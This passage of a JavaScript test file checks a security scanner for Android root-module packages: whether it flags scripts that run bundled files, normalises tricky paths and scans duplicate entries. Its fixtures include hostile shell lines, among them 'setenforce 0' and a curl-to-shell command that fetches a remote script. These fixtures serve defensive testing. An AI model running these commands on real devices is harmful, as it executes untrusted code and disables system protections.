  assert.equal(a.riskLevel, 'low', JSON.stringify(a.findings));
  assert.deepEqual(a.escalated.map((e) => e.resolvedEntry), ['notes.dat'],
    '豁免只作用于「报不报」；被引用的条目照样进扫描面，别把注释当免检通道');

  for (const [line, want] of [
    ['echo hi sh $MODDIR/x.dat', 'x.dat'],
    ['. $MODDIR/functions', 'functions'],
    ["sh '$MODDIR/lib.dat'", 'lib.dat'],
    ['sh${IFS}$MODDIR/x.bin', 'x.bin'],
    ['$MODDIR/tool.bin', 'tool.bin'],
    ['do_thing || $MODDIR/stage2.bin', 'stage2.bin'],
  ]) {
    const zip = makeModuleZip({ id: 'eval.h4b', files: [
      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
      [want, 'echo payload\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    assert.ok(r.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'), line + ' 必须报');
    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), [want], line + ' 必须升级 ' + want);
    assert.equal(r.riskLevel, 'high', line);
  }
});

test('fix1-⑤：归一化覆盖 //、..、.、反斜杠、大小写变体', async () => {
  assert.equal(normalizeRefPath('sub/../x.dat'), 'x.dat');
  assert.equal(normalizeRefPath('sub/./x.dat'), 'sub/x.dat');
  assert.equal(normalizeRefPath('//x.dat'), 'x.dat');
  assert.equal(normalizeRefPath('sub\\..\\x.dat'), 'x.dat');
  assert.equal(normalizeRefPath('../escape.dat'), null, '上跳越出模块根目录的不算包内条目');

  for (const [line, want] of [
    ['sh $MODDIR//norm.dat', 'norm.dat'],
    ['sh $MODDIR/sub/../norm.dat', 'norm.dat'],
    ['sh $MODDIR/./norm.dat', 'norm.dat'],
    ['sh $MODDIR\\sub\\inner.dat', 'sub/inner.dat'],
    ['sh $MODDIR/NORM.DAT', 'norm.dat'],
  ]) {
    const zip = makeModuleZip({ id: 'eval.h5', files: [
      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
      ['norm.dat', 'setenforce 0\n'],
      ['sub/inner.dat', 'setenforce 0\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), [want], line + ' → ' + want);
    const f = r.findings.find((x) => x.ruleId === 'EXEC_BUNDLED_FILE');
    assert.equal(f.advice, EXEC_BUNDLED_FILE.advice, '解析到并读过了，才允许保留「读一遍」那句承诺');
    assert.ok(r.findings.some((x) => x.ruleId === 'SELINUX_DISABLE' && x.file === want),
      '归一化之后要真的把那个条目读了：' + line);
  }
});

test('fix1-⑤：归一化后仍解析不到时，报告不许承诺它没做到的事', async () => {
  for (const line of ['sh $MODDIR/ghost.dat', 'sh $MODDIR/../escape.dat', 'sh $MODDIR/$SUB/x.dat']) {
    const zip = makeModuleZip({ id: 'eval.h5b', files: [
      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
      ['x.dat', 'setenforce 0\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    assert.deepEqual(r.escalated, [], line + ' 解析不到条目，不该假装升级');
    const f = r.findings.find((x) => x.ruleId === 'EXEC_BUNDLED_FILE');
    assert.ok(f, line + ' 仍要报（fail-closed：多拦可申诉）');
    assert.equal(f.advice, EXEC_UNRESOLVED_ADVICE);
    assert.ok(!f.advice.includes('读一遍'), '不许在报告里说「把那个文件也读一遍」而实际没读');
    assert.equal(r.riskLevel, 'high', line);
  }
});

test('fix1-⑥：同一载荷被多种写法引用只升级一次；同名不同内容的重复条目全都要扫', async () => {
  const once = makeModuleZip({ id: 'eval.h6a', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.dat\nsh $MODDIR//payload.dat\nbash ${MODDIR}/payload.dat\n'],
    ['payload.dat', 'echo one\n'],
  ]});
  const a = await scanToReport(once, { changeType: 'first' });
  assert.equal(a.escalated.length, 1, '三种写法指向同一份内容，扫描面里只能有一份');
  assert.equal(a.scripts.filter((s) => s.name === 'payload.dat').length, 1);
  assert.equal(a.inventory.escalated.length, 1);

  // 同名重复条目：两份内容都得进扫描面，否则「放两份同名、审核读干净那份」正是这条闸要拦的手法
  const dup = makeModuleZip({ id: 'eval.h6b', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/dup.dat\n'],
    ['dup.dat', 'setenforce 0\n'],
    ['dup.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
  ]});
  const b = await scanToReport(dup, { changeType: 'first' });
  assert.deepEqual(b.escalated.map((e) => e.resolvedEntry), ['dup.dat', 'dup.dat'],
    '同名不同内容的两份都要升级；去重只去「内容相同」的那一类');
  const ids = b.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('SELINUX_DISABLE') && ids.includes('PIPE_TO_SHELL'), ids.join(','));
  assert.ok(ids.includes('STRUCT_DUPLICATE_NAME'), ids.join(','));

  // 内容完全相同的重复条目只扫一遍，别把产物灌两遍
  const same = makeModuleZip({ id: 'eval.h6c', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/same.dat\nsh $MODDIR//same.dat\n'],
    ['same.dat', 'echo same\n'],
    ['same.dat', 'echo same\n'],
  ]});
  const c = await scanToReport(same, { changeType: 'first' });
  assert.equal(c.escalated.length, 1, '同名的两份同内容条目算一份，扫描面里不许出现两遍');
});

test('fixtures：干净模块带 changeType: first 仍可自动放行，不带 opts 则不可达（F15）', async () => {
  const clean = makeModuleZip({ id: 'eval.clean', files: [['service.sh', CLEAN_SH]] });
  const withOpts = await scanToReport(clean, { changeType: 'first' });
  assert.equal(withOpts.meta.id, 'eval.clean', 'makeModuleZip 必须自带 module.prop，否则 id 解析不到');
  assert.equal(withOpts.riskLevel, 'low', JSON.stringify(withOpts.findings));
  assert.equal(withOpts.decision.action, 'auto-approve');
  assert.deepEqual(withOpts.escalated, [], '干净模块不该有升级条目');
  assert.ok(!withOpts.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    CLEAN_SH + ' 里的 `cp -f busybox $MODPATH/...` 不是执行别的文件');

  // 同一个包不带 opts：changeType 落到 unknown，low+unknown 只能是 request-review。
  // 这条断言是留着提醒回归表：scanToReport(zip) 这个形状下「干净模块自动放行」永远测不到。
  const bare = await scanToReport(clean);
  assert.equal(bare.changeType, 'unknown');
  assert.equal(bare.decision.action, 'request-review');
  assert.equal(bare.riskLevel, 'low');

  assert.match(moduleProp('eval.x'), /^id=eval\.x$/m);
});


